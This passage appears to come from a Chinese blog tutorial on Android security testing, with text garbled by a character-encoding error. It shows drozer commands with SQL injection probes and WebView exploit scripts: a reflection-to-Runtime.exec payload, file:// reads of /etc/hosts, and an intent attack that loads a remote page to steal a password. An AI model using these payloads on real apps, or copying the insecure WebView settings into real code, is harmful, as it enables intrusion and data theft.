class="attr">android:name</span>=<span class="string">&quot;è¦æ³¨å†Œæ„å›¾çš„Activity&quot;</span></span></span><br><span class="line"><span class="tag">          <span class="attr">android</span>ï¼š<span class="attr">label</span>=<span class="string">&quot;xxx&quot;</span></span></span><br><span class="line"><span class="tag">          </span></span><br><span class="line"><span class="tag">&lt;/<span class="attr">activity</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">&quot;è¦å¡«å…¥å†…å®¹&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">category</span> <span class="attr">android:name</span>=<span class="string">&quot;android.intent.category.DEFAULT&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">intent-filter</span>&gt;</span></span><br></pre></td></tr></table></figure><p>å¯åŠ¨ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(View V)</span>&#123;</span><br><span class="line">    <span class="type">Intent</span> <span class="variable">intent</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>();</span><br><span class="line">    intent.setAction(<span class="string">&quot;é…ç½®æ–‡ä»¶ä¸­æ·»åŠ çš„å†…å®¹ä¿¡æ¯&quot;</span>)</span><br><span class="line">    intent.putExtra(<span class="string">&quot;key_account&quot;</span>,<span class="string">&quot;admin&quot;</span>);</span><br><span class="line">    intent.putExtra(<span class="string">&quot;key_password&quot;</span>,<span class="string">&quot;test&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="å››å¤§ç»„ä»¶ç®€å•æ¼æ´">å››å¤§ç»„ä»¶ç®€å•æ¼æ´</h2><h3 id="Activity-2">Activity</h3><h4 id="è¶Šæƒç»•è¿‡"><strong>è¶Šæƒç»•è¿‡</strong></h4><p><strong>åŸç†</strong></p><p>åœ¨Androidç³»ç»Ÿä¸­ï¼ŒActivityé»˜è®¤æ˜¯ä¸å¯ä»¥å¯¼å‡ºçš„ï¼Œå¦‚æœè®¾ç½®äº†exported =&quot;true&quot;æˆ–è€…æ·»åŠ äº†&lt;intent<code>-</code>filter&gt;ï¼Œè¿™æ ·Activityå°±å˜æˆäº†å¯å¯¼å‡ºï¼Œå°±ä¼šå¯¼è‡´è¶Šæƒç»•è¿‡æˆ–è€…æ˜¯æ³„éœ²æ•æ„Ÿä¿¡æ¯ç­‰å®‰å…¨é£é™©ã€‚</p><p>å¯¹äºæ¼æ´æ£€æµ‹å¯ä»¥ä½¿ç”¨drozerã€‚</p><p><strong>drozerç®€å•ä½¿ç”¨</strong></p><ul><li><p>drozerè¿æ¥</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">adb</span> forward tcp:<span class="number">31415</span> tcp:<span class="number">31415</span></span><br><span class="line"><span class="attribute">drozer</span> console connect</span><br></pre></td></tr></table></figure></li><li><p>è¿›å…¥drozerè¾“å…¥listæˆ–lsï¼ŒæŸ¥çœ‹drozer æ‰€æœ‰æ¨¡å—</p></li><li><p>æŸ¥æ‰¾å®‰è£…åŒ…  <code>run  app.package.list -f  </code></p></li><li><p>æŸ¥çœ‹å®‰è£…åŒ…ä¿¡æ¯ <code>run  app.package.info -a å®‰è£…åŒ…å</code></p></li><li><p>æŸ¥çœ‹æš´éœ²çš„ç»„ä»¶<br>Drozerå¯æ£€æµ‹apkæºç å››å¤§ç»„ä»¶ï¼ˆactivitiesã€broadcast receiversã€content providersã€servicesï¼‰çš„exportæƒ…å†µï¼Œå¹¶åˆ¤æ–­exportçš„ç»„ä»¶æä¾›é‚£äº›æœåŠ¡(exportedâ€è¡¨ç¤ºç»„ä»¶å¯ä»¥è¢«å…¶ä»–Appä½¿ç”¨)ï¼Œå› ä¸ºæœåŠ¡æ˜¯å¯ä»¥è°ƒè¯•çš„ï¼Œå¯ä»¥å°†è°ƒè¯•å™¨é™„åŠ åˆ°è¿›ç¨‹ä¸Šï¼Œè¿›è¡Œè°ƒè¯•ã€‚<br><code>run  app.package.attacksurface  å®‰è£…åŒ…å</code></p></li></ul><p><code>run app.activity.info  -a  å®‰è£…åŒ…å </code></p><p><code>run app.activity.start --component åŒ…å ç»„ä»¶å</code></p><p>è°ƒç”¨ç»„ä»¶æœåŠ¡ ==&gt; <code>run app.service.start --action æœåŠ¡å --component åŒ…å æœåŠ¡å</code></p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">Broadcastç»„ä»¶</span><br><span class="line"></span><br><span class="line">run app<span class="selector-class">.broadcast</span><span class="selector-class">.info</span> -<span class="selector-tag">a</span> &lt;package name&gt; æµ‹è¯•å¯¹å¤–çš„broadcastç»„ä»¶ä¿¡æ¯</span><br><span class="line">run app<span class="selector-class">.broadcast</span><span class="selector-class">.send</span> <span class="attr">--component</span> &lt;package name&gt; &lt;component name&gt; <span class="attr">--action</span> &lt;action&gt; <span class="attr">--extra</span> &lt;type&gt; &lt;key&gt; &lt;value&gt; å‘é€å¸¦å‚æ•°çš„æ¶æ„å¹¿æ’­</span><br><span class="line">run app<span class="selector-class">.broadcast</span><span class="selector-class">.send</span> <span class="attr">--action</span> &lt;action&gt; å‘å¹¿æ’­ç»„ä»¶å‘é€ä¸å®Œæ•´intentä½¿ç”¨ç©ºextrasï¼Œå¯ä»¥çœ‹åˆ°åº”ç”¨åœæ­¢è¿è¡Œ</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Contentç»„ä»¶</span><br><span class="line"></span><br><span class="line">run app<span class="selector-class">.provider</span><span class="selector-class">.info</span>   -<span class="selector-tag">a</span> </span><br><span class="line">run scanner<span class="selector-class">.provider</span><span class="selector-class">.findurls</span> -<span class="selector-tag">a</span> &lt;package name&gt;  æ‰«æurl</span><br><span class="line">run app<span class="selector-class">.provider</span><span class="selector-class">.query</span> uri  è®¿é—®url</span><br><span class="line"></span><br><span class="line">run scanner<span class="selector-class">.provider</span><span class="selector-class">.injection</span> -<span class="selector-tag">a</span> packageName æ‰«æé‚£é‡Œå¯ä»¥è¿›è¡ŒSQLæ³¨å…¥</span><br><span class="line">run scanner<span class="selector-class">.provider</span><span class="selector-class">.sqltables</span> -<span class="selector-tag">a</span> com<span class="selector-class">.mwr</span><span class="selector-class">.example</span><span class="selector-class">.sieve</span> åˆ—ä¸¾appçš„è¡¨ä¿¡æ¯</span><br><span class="line">projection æµ‹è¯•ï¼šrun app<span class="selector-class">.provider</span><span class="selector-class">.query</span> contentProviderURI <span class="attr">--projection</span> <span class="string">&quot;&#x27;&quot;</span></span><br><span class="line">selection æµ‹è¯•ï¼šrun app<span class="selector-class">.provider</span><span class="selector-class">.query</span> contentProviderURI <span class="attr">--selection</span> <span class="string">&quot;&#x27;&quot;</span></span><br><span class="line">projectionæ³¨å…¥è¯­å¥æµ‹è¯•ï¼šrun app<span class="selector-class">.provider</span><span class="selector-class">.query</span> contentProviderURI <span class="attr">--projection</span> <span class="string">&quot;* FROM xx;--&quot;</span></span><br><span class="line">Selectionæ³¨å…¥è¯­å¥æµ‹è¯•ï¼šrun app<span class="selector-class">.provider</span><span class="selector-class">.query</span> contentProviderURI <span class="attr">--selection</span> <span class="string">&quot;1=1);--&quot;</span></span><br><span class="line"></span><br><span class="line">ç›®å½•éå†æ¼æ´æ£€æµ‹ï¼š</span><br><span class="line">run scanner<span class="selector-class">.provider</span><span class="selector-class">.traversal</span> -<span class="selector-tag">a</span> &lt;package name&gt;</span><br></pre></td></tr></table></figure><h2 id="WebView">WebView</h2><h3 id="å†å²æ¼æ´">å†å²æ¼æ´</h3><p>ç®€å•è¯´ä¸€è¯´å°±æ˜¯</p><ol><li><p>jså’ŒAndroidè¿›è¡Œé€šä¿¡æ—¶ï¼Œæœ‰ä¸ª<code>addJavascriptInterface</code>æ¥å£è¿›è¡Œå¯¹è±¡æ˜ å°„ï¼Œå¯ä»¥é€šè¿‡æ˜ å°„çš„jså¯¹è±¡è°ƒç”¨androidå¯¹è±¡çš„æ–¹æ³•<br><strong>æ”»å‡»æ­¥éª¤</strong></p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ï¼ˆ<span class="string">``</span><span class="number">1</span><span class="string">``</span>ï¼‰Androidä¸­çš„å¯¹è±¡æœ‰ä¸€å…¬å…±çš„æ–¹æ³•ï¼šgetClass()</span><br><span class="line">ï¼ˆ<span class="string">``</span><span class="number">2</span><span class="string">``</span>ï¼‰è¯¥æ–¹æ³•å¯ä»¥è·å–åˆ°å½“å‰ç±» ç±»å‹Class</span><br><span class="line">ï¼ˆ<span class="string">``</span><span class="number">3</span><span class="string">``</span>ï¼‰è¯¥ç±»æœ‰ä¸€å…³é”®çš„æ–¹æ³•ï¼š Class.forNameï¼›</span><br><span class="line">ï¼ˆ<span class="string">``</span><span class="number">4</span><span class="string">``</span>ï¼‰è¯¥æ–¹æ³•å¯ä»¥åŠ è½½ä¸€ä¸ªç±»ï¼ˆå¯åŠ è½½ java.lang.Runtime ç±»ï¼‰</span><br><span class="line">ï¼ˆ<span class="string">``</span><span class="number">5</span><span class="string">``</span>ï¼‰è€Œè¯¥ç±»æ˜¯å¯ä»¥æ‰§è¡Œæœ¬åœ°å‘½ä»¤çš„</span><br></pre></td></tr></table></figure></li></ol><p>â€‹  æ”»å‡»è„šæœ¬</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">function <span class="title function_">execute</span><span class="params">(cmdArgs)</span> </span><br><span class="line">&#123; </span><br><span class="line">    <span class="comment">// æ­¥éª¤1ï¼šéå† window å¯¹è±¡</span></span><br><span class="line">    <span class="comment">// ç›®çš„æ˜¯ä¸ºäº†æ‰¾åˆ°åŒ…å« getClass ï¼ˆï¼‰çš„å¯¹è±¡</span></span><br><span class="line">    <span class="comment">// å› ä¸ºAndroidæ˜ å°„çš„JSå¯¹è±¡ä¹Ÿåœ¨windowä¸­ï¼Œæ‰€ä»¥è‚¯å®šä¼šéå†åˆ°</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> obj in window) &#123; </span><br><span class="line">        <span class="keyword">if</span> (<span class="string">&quot;getClass&quot;</span> in window[obj]) &#123; </span><br><span class="line"> </span><br><span class="line">      <span class="comment">// æ­¥éª¤2ï¼šåˆ©ç”¨åå°„è°ƒç”¨forNameï¼ˆï¼‰å¾—åˆ°Runtimeç±»å¯¹è±¡</span></span><br><span class="line">            alert(obj);         </span><br><span class="line">            <span class="keyword">return</span>  window[obj].getClass().forName(<span class="string">&quot;java.lang.Runtime&quot;</span>) </span><br><span class="line"> </span><br><span class="line">      <span class="comment">// æ­¥éª¤3ï¼šä»¥åï¼Œå°±å¯ä»¥è°ƒç”¨é™æ€æ–¹æ³•æ¥æ‰§è¡Œä¸€äº›å‘½ä»¤ï¼Œæ¯”å¦‚è®¿é—®æ–‡ä»¶çš„å‘½ä»¤</span></span><br><span class="line">getMethod(<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>).invoke(<span class="literal">null</span>,<span class="literal">null</span>).exec(cmdArgs); </span><br><span class="line"> </span><br><span class="line"><span class="comment">// ä»æ‰§è¡Œå‘½ä»¤åè¿”å›çš„è¾“å…¥æµä¸­å¾—åˆ°å­—ç¬¦ä¸²ï¼Œæœ‰å¾ˆä¸¥é‡æš´éœ²éšç§çš„å±é™©ã€‚</span></span><br><span class="line"><span class="comment">// å¦‚æ‰§è¡Œå®Œè®¿é—®æ–‡ä»¶çš„å‘½ä»¤ä¹‹åï¼Œå°±å¯ä»¥å¾—åˆ°æ–‡ä»¶åçš„ä¿¡æ¯äº†ã€‚</span></span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>2.webviewé»˜è®¤å¼€å¯å¯†ç ä¿å­˜ï¼Œä¼šä¿å­˜åœ¨ <code>/data/data/com.package.name/databases/webview.db</code></p><h3 id="è·¨åŸŸæ¼æ´">è·¨åŸŸæ¼æ´</h3><h4 id="ä»»æ„æ–‡ä»¶çªƒå–"><strong>ä»»æ„æ–‡ä»¶çªƒå–</strong></h4><p><strong>åŸç†</strong>ï¼šsetAllowFileAccess(true) + setAllowFileAccessFromFileURLs(true)</p><p>è¿™æ ·ä½¿webviewå¯ä»¥ä½¿ç”¨Fileåè®®ï¼Œä¸”åŠ è½½çš„jsè„šæœ¬æ–‡ä»¶å¯ä»¥è®¿é—®æœ¬åœ°æ–‡ä»¶</p><p><strong>å¤ç°</strong>ï¼šè·å¾—/etc/hostsä¸­ç§æœ‰æ–‡ä»¶ä¿¡æ¯</p><p>ç¼–å†™jsè„šæœ¬</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">loadXMLDoc</span>(<span class="params"></span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">var</span> arm = <span class="string">&quot;file:///etc/hosts&quot;</span>;  </span><br><span class="line">    <span class="keyword">var</span> xmlhttp;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable language_">window</span>.<span class="property">XMLHttpRequest</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        xmlhttp=<span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    xmlhttp.<span class="property">onreadystatechange</span>=<span class="keyword">function</span>(<span class="params"></span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//alert(&quot;status is&quot;+xmlhttp.status);</span></span><br><span class="line">        <span class="keyword">if</span> (xmlhttp.<span class="property">readyState</span>==<span class="number">4</span>)</span><br><span class="line">        &#123;</span><br><span class="line">              <span class="variable language_">console</span>.<span class="title function_">log</span>(xmlhttp.<span class="property">responseText</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    xmlhttp.<span class="title function_">open</span>(<span class="string">&quot;GET&quot;</span>,arm);</span><br><span class="line">    xmlhttp.<span class="title function_">send</span>(<span class="literal">null</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">loadXMLDoc</span>();</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>ç„¶åå°†jsè„šæœ¬ä¸Šä¼ ç½®/data/local/tmpç›®å½•ä¸‹</p><p>ç¼–å†™æ”»å‡»è„šæœ¬</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line">  <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">      <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">      setContentView(R.layout.activity_file_web_view);</span><br><span class="line">      <span class="type">WebView</span> <span class="variable">webView</span> <span class="operator">=</span> findViewById(R.id.Wind_webview0);</span><br><span class="line">      <span class="comment">//è®¾ç½®æ˜¯å¦å…è®¸ WebView ä½¿ç”¨ File åè®®</span></span><br><span class="line">      webView.getSettings().setAllowFileAccess(<span class="literal">true</span>);</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">      <span class="comment">//è®¾ç½®æ˜¯å¦å…è®¸ WebView ä½¿ç”¨ JavaScript</span></span><br><span class="line">      webView.getSettings().setJavaScriptEnabled(<span class="literal">true</span>);</span><br><span class="line">      webView.getSettings().setAllowFileAccessFromFileURLs(<span class="literal">true</span>);</span><br><span class="line"> </span><br><span class="line">      webView.loadUrl(<span class="string">&quot;file:///data/local/tmp/fileAttack.html&quot;</span>);</span><br><span class="line"> </span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œå°±è·å–äº†ç›¸åº”çš„ç§æœ‰æ–‡ä»¶ä¿¡æ¯ï¼Œè€Œä¸”åŠ è½½äº†æˆ‘ä»¬çš„æ¶æ„htmlæ–‡ä»¶</p><h4 id="é€šç”¨åè®®æ¼æ´-æ¶æ„ç½‘é¡µæ³¨å…¥">é€šç”¨åè®®æ¼æ´(æ¶æ„ç½‘é¡µæ³¨å…¥)</h4><p>æ¼æ´åŸç†ï¼šsetAllowFileAccess(true) + setAllowUniversalAccessFromFileURLs(true)</p><p>æœ¬è´¨å’Œä¸Šé¢çš„å·®ä¸å¤šï¼Œå°†jsè„šæœ¬é“¾æ¥æ”¹ä¸ºä¸€ä¸ªç½‘é¡µçš„url</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">loadXMLDoc</span>(<span class="params"></span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">var</span> arm = <span class="string">&quot;https://bbs.pediy.com/&quot;</span>;</span><br><span class="line">    <span class="keyword">var</span> xmlhttp;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable language_">window</span>.<span class="property">XMLHttpRequest</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        xmlhttp=<span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    xmlhttp.<span class="property">onreadystatechange</span>=<span class="keyword">function</span>(<span class="params"></span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//alert(&quot;status is&quot;+xmlhttp.status);</span></span><br><span class="line">        <span class="keyword">if</span> (xmlhttp.<span class="property">readyState</span>==<span class="number">4</span>)</span><br><span class="line">        &#123;</span><br><span class="line">              <span class="variable language_">console</span>.<span class="title function_">log</span>(xmlhttp.<span class="property">responseText</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    xmlhttp.<span class="title function_">open</span>(<span class="string">&quot;GET&quot;</span>,arm);</span><br><span class="line">    xmlhttp.<span class="title function_">send</span>(<span class="literal">null</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">loadXMLDoc</span>();</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><h4 id="ç¬¦å·é“¾æ¥è·¨æºæ”»å‡»">ç¬¦å·é“¾æ¥è·¨æºæ”»å‡»</h4><p>setAllowFileAccessä¸ºTrue</p><p><strong>åŸç†ï¼š</strong></p><p>å…¶æ”»å‡»è¿‡ç¨‹é¦–å…ˆæ˜¯æ“çºµWebViewå»è®¿é—®ä¸€ä¸ªæ”»å‡»APPè‡ªå·±å…¬å¼€å‡ºæ¥çš„ç½‘é¡µï¼Œç„¶åè¿™ä¸ªç½‘é¡µæ‰§è¡Œçš„å†…å®¹å…¶å®å°±æ˜¯å»¶æ—¶å»è¯»å–è‡ªèº«ã€‚åœ¨å»¶æ—¶è¯»å–è‡ªèº«çš„æ—¶é—´çª—å£å†…ï¼Œè¿™ä¸ªæ–‡ä»¶æ‚„æ‚„è¢«è¿›è¡Œäº†æ›¿æ¢ï¼Œæ›¿æ¢æˆäº†è½¯é“¾æ¥ï¼ŒæŒ‡å‘å—å®³APPçš„ä¸€ä¸ªç§æœ‰æ–‡ä»¶ï¼Œæœ€ç»ˆè¯»å–çªƒå–å…¶å†…å®¹ã€‚</p><h3 id="intent-webview">intent+webview</h3><p>æ ·ä¾‹ä»£ç </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">public class JsIntentActivity extends AppCompatActivity &#123;</span><br><span class="line"> </span><br><span class="line">    @Override</span><br><span class="line">    protected void onCreate(Bundle savedInstanceState) &#123;</span><br><span class="line">        super.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_js_intent);</span><br><span class="line">        WebView webView = findViewById(R.id.Wind_webviewIntent);</span><br><span class="line">        webView.getSettings().setJavaScriptEnabled(true);</span><br><span class="line">        webView.addJavascriptInterface(new AndroidtoJs(), &quot;test&quot;);</span><br><span class="line">        webView.loadData(&quot;&quot;, &quot;text/html&quot;, null);</span><br><span class="line">        Uri getUri = getIntent().getData();</span><br><span class="line">        webView.loadUrl(String.valueOf(getUri));</span><br><span class="line"> </span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    /**</span><br><span class="line">     * æä¾›æ¥å£åœ¨Webviewä¸­ä¾›JSè°ƒç”¨</span><br><span class="line">     */</span><br><span class="line">    public class AndroidtoJs &#123;</span><br><span class="line">        // å®šä¹‰JSéœ€è¦è°ƒç”¨çš„æ–¹æ³•ï¼Œè¢«JSè°ƒç”¨çš„æ–¹æ³•å¿…é¡»åŠ å…¥@JavascriptInterfaceæ³¨è§£</span><br><span class="line">        @JavascriptInterface</span><br><span class="line">        public String getPassword() &#123;</span><br><span class="line">            return &quot;WindXaa12345678&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ ·ä¾‹çš„æ§ä»¶ä¸ºå¯å¯¼å‡º</p><p>æ”»å‡»è„šæœ¬</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MainActivity</span> <span class="keyword">extends</span> <span class="title class_">AppCompatActivity</span> &#123;</span><br><span class="line"> </span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line">        <span class="type">Button</span> <span class="variable">button</span> <span class="operator">=</span> findViewById(R.id.button);</span><br><span class="line">        button.setOnClickListener(<span class="keyword">new</span> <span class="title class_">View</span>.OnClickListener() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(View v)</span> &#123;</span><br><span class="line">                <span class="type">Intent</span> <span class="variable">attackIntent</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>();</span><br><span class="line">                attackIntent.setClassName(<span class="string">&quot;com.iwindxaa.webview&quot;</span>,<span class="string">&quot;com.iwindxaa.webview.JsIntentActivity&quot;</span>);</span><br><span class="line">                attackIntent.setData(Uri.parse(<span class="string">&quot;http://ipåœ°å€ç«¯å£å·/attack.html&quot;</span>));</span><br><span class="line">                startActivity(attackIntent);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line"> </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æœ¬åœ°ç¼–å†™æ¶æ„çš„htmlï¼Œåˆ©ç”¨å‰é¢è®²è¿°çš„è¿œç¨‹åŠ è½½</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;!<span class="variable constant_">DOCTYPE</span> html&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>WebView Atack<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">         <span class="keyword">function</span> <span class="title function_">callAndroid</span>(<span class="params"></span>)&#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">            <span class="comment">//ç”±äºå¯¹è±¡æ˜ å°„ï¼Œæ‰€ä»¥è°ƒç”¨testå¯¹è±¡ç­‰äºè°ƒç”¨Androidæ˜ å°„çš„å¯¹è±¡</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">            <span class="keyword">var</span> password = test.<span class="title function_">getPassword</span>();</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">            <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;getdata&quot;</span>).<span class="property">innerHTML</span>= password;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">         &#125;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">     </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">   <span class="tag">&lt;<span class="name">p</span> <span class="attr">id</span>=<span class="string">&quot;getdata&quot;</span>&gt;</span>æ”»å‡»è·å¾—çš„æ•°æ®å°†æ˜¾ç¤ºåœ¨æ­¤â€¦â€¦<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">   <span class="comment">&lt;!--ç‚¹å‡»æŒ‰é’®åˆ™è°ƒç”¨callAndroidå‡½æ•°--&gt;</span></span></span><br><span class="line"><span class="language-xml">   <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">id</span>=<span class="string">&quot;button1&quot;</span> <span class="attr">onclick</span>=<span class="string">&quot;callAndroid()&quot;</span>&gt;</span>CIntent Attack!<span class="tag">&lt;/<span 